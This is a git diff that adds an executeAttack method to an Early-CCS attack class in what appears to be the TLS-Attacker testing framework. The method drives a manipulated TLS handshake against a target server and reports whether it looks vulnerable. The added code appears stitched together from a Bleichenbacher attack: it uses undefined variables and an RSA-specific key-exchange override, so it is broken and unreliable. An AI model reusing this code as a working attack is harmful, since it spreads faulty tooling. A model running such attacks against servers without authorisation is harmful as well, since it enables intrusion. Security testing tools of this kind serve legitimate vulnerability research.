@@ -19,10 +19,13 @@
  */
 package de.rub.nds.tlsattacker.attacks.impl;
 
+import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
 import de.rub.nds.tlsattacker.tls.Attacker;
 import de.rub.nds.tlsattacker.attacks.config.EarlyCCSCommandConfig;
+import de.rub.nds.tlsattacker.attacks.pkcs1.PKCS1VectorGenerator;
 import de.rub.nds.tlsattacker.modifiablevariable.ModifiableVariable;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
+import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
 import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
 import de.rub.nds.tlsattacker.tls.protocol.ccs.ChangeCipherSpecMessage;
@@ -39,18 +42,69 @@ import de.rub.nds.tlsattacker.transport.TransportHandlerFactory;
 import de.rub.nds.tlsattacker.transport.TransportHandlerType;
 import de.rub.nds.tlsattacker.tls.config.CommandConfig;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
+import de.rub.nds.tlsattacker.tls.config.WorkflowTraceSerializer;
+import de.rub.nds.tlsattacker.tls.constants.AlertDescription;
+import de.rub.nds.tlsattacker.tls.constants.AlertLevel;
+import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
+import de.rub.nds.tlsattacker.tls.protocol.alert.AlertMessage;
+import de.rub.nds.tlsattacker.tls.util.CertificateFetcher;
+import de.rub.nds.tlsattacker.tls.util.LogLevel;
+import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.security.Security;
+import java.security.interfaces.RSAPublicKey;
+import java.util.HashSet;
+import java.util.LinkedList;
+import java.util.List;
+import javax.xml.bind.JAXBException;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 import org.bouncycastle.jce.provider.BouncyCastleProvider;
 
 /**
  * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
  */
 public class EarlyCCSAttack extends Attacker<EarlyCCSCommandConfig> {
+    
+    public static Logger LOGGER = LogManager.getLogger(EarlyCCSAttack.class);
 
     public EarlyCCSAttack(EarlyCCSCommandConfig config) {
 	super(config);
     }
 
+    @Override
+    public void executeAttack(ConfigHandler configHandler) {
+        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
+	TlsContext tlsContext = configHandler.initializeTlsContext(config);
+	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
+
+	WorkflowTrace trace = tlsContext.getWorkflowTrace();
+	RSAClientKeyExchangeMessage cke = (RSAClientKeyExchangeMessage) trace
+		.getFirstHandshakeMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE);
+	ModifiableByteArray epms = new ModifiableByteArray();
+	epms.setModification(ByteArrayModificationFactory.explicitValue(encryptedPMS));
+	cke.setEncryptedPremasterSecret(epms);
+	try {
+	    FileOutputStream fos = new FileOutputStream("/tmp/test.xml");
+	    WorkflowTraceSerializer.write(fos, trace);
+	} catch (IOException | JAXBException ex) {
+	    ex.printStackTrace();
+	}
+
+	workflowExecutor.executeWorkflow();
+	transportHandler.closeConnection();
+	trace.getProtocolMessages().get(trace.getProtocolMessages().size() - 1);
+	
+	if (protocolMessageSet.size() == 1) {
+	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, Not vulnerable, one message found: {}", config.getConnect(),
+		    sb.toString());
+	} else {
+	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "{}, Vulnerable (probably), found: {}", config.getConnect(),
+		    sb.toString());
+	}
+    }
+    
     // public static void main(String[] args) throws Exception {
     //
     // // start the server with ./openssl s_server -accept 51624 -key
@@ -122,9 +176,4 @@ public class EarlyCCSAttack extends Attacker<EarlyCCSCommandConfig> {
     // // at least with the tested 1.0.1 version
     // executor.executeWorkflow();
     // }
-
-    @Override
-    public void executeAttack(ConfigHandler configHandler) {
-	throw new UnsupportedOperationException("Not supported yet.");
-    }
 }
